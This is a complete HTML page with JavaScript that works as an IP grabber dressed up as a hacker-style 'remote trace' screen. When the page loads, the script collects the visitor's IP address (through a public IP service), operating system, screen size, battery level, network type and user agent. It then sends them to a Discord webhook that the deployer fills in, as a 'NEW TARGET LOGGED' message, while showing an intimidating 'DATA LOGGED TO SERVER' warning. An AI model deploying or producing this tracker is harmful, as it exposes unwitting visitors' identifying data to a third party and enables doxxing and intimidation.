<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Initializing Trace...</title>
<style>
    body {
        margin: 0;
        background-color: #050505;
        color: #00ff00;
        font-family: 'Courier New', Courier, monospace;
        padding: 20px;
        font-size: 14px;
        line-height: 1.5;
        overflow-x: hidden;
    }
    .red { color: #ff3333; }
    .box {
        border: 1px solid #333;
        padding: 15px;
        margin-bottom: 20px;
        background: #0a0a0a;
        box-shadow: 0 0 10px rgba(0,255,0,0.1);
    }
    .data-row {
        display: flex;
        justify-content: space-between;
        border-bottom: 1px dashed #333;
        padding: 5px 0;
    }
    .data-label { color: #888; }
    .data-value { color: #fff; font-weight: bold; }
    #warning {
        display: none;
        color: red;
        font-size: 24px;
        text-align: center;
        margin-top: 30px;
        font-weight: bold;
        animation: flash 0.5s infinite alternate;
    }
    @keyframes flash {
        from { opacity: 0.5; }
        to { opacity: 1; }
    }
</style>
</head>
<body>

<div id="terminal">
    > INITIATING REMOTE TRACE...<br>
    > CONNECTING TO IFB MAINFRAME...<br>
    > TARGET ACQUIRED. EXTRACTING METADATA...<br><br>
</div>

<div class="box" id="dataBox" style="display:none;">
    <div class="data-row"><span class="data-label">IP ADDRESS:</span> <span class="data-value" id="ip">Fetching...</span></div>
    <div class="data-row"><span class="data-label">OPERATING SYSTEM:</span> <span class="data-value" id="os">Fetching...</span></div>
    <div class="data-row"><span class="data-label">SCREEN RES:</span> <span class="data-value" id="screen">Fetching...</span></div>
    <div class="data-row"><span class="data-label">BATTERY:</span> <span class="data-value" id="battery">Fetching...</span></div>
    <div class="data-row"><span class="data-label">NETWORK:</span> <span class="data-value" id="network">Fetching...</span></div>
</div>

<div id="warning">⚠️ DATA LOGGED TO SERVER ⚠️</div>

<script>
    // --- PASTE YOUR DISCORD WEBHOOK URL HERE ---
    const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";

    const terminal = document.getElementById('terminal');
    const dataBox = document.getElementById('dataBox');

    // Get basic info
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenW = window.screen.width;
    const screenH = window.screen.height;
    
    let osName = "Unknown";
    if (userAgent.indexOf("Win") != -1) osName = "Windows";
    if (userAgent.indexOf("Mac") != -1) osName = "MacOS";
    if (userAgent.indexOf("Android") != -1) osName = "Android";
    if (userAgent.indexOf("like Mac") != -1) osName = "iOS";

    let connectionType = "Unknown";
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || "Unknown";
    }

    let batteryLevel = "Unknown";
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            batteryLevel = Math.round(battery.level * 100) + "%";
            document.getElementById('battery').innerText = batteryLevel;
        });
    }

    // Fetch IP Address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            
            // Update UI
            document.getElementById('ip').innerText = ip;
            document.getElementById('os').innerText = osName;
            document.getElementById('screen').innerText = screenW + "x" + screenH;
            document.getElementById('network').innerText = connectionType;

            dataBox.style.display = 'block';
            document.getElementById('warning').style.display = 'block';

            // LOG TO DISCORD
            sendToDiscord(ip, osName, screenW + "x" + screenH, batteryLevel, connectionType, userAgent);
        })
        .catch(() => {
            document.getElementById('ip').innerText = "Blocked by VPN/AdBlock";
            dataBox.style.display = 'block';
            document.getElementById('warning').style.display = 'block';
            sendToDiscord("Blocked IP", osName, screenW + "x" + screenH, batteryLevel, connectionType, userAgent);
        });

    async function sendToDiscord(ip, os, screen, battery, network, ua) {
        if (WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") return;

        const payload = {
            username: "IFB Tracker Bot",
            embeds: [{
                title: "🎯 NEW TARGET LOGGED",
                color: 16711680, // Red
                fields: [
                    { name: "IP Address", value: ip, inline: true },
                    { name: "OS", value: os, inline: true },
                    { name: "Screen", value: screen, inline: true },
                    { name: "Battery", value: battery, inline: true },
                    { name: "Network", value: network, inline: true },
                    { name: "User Agent", value: `\`\`\`${ua}\`\`\`` }
                ],
                footer: { text: "IFB Security System | " + new Date().toLocaleString() }
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(e) { console.error(e); }
    }
</script>
</body>
</html>
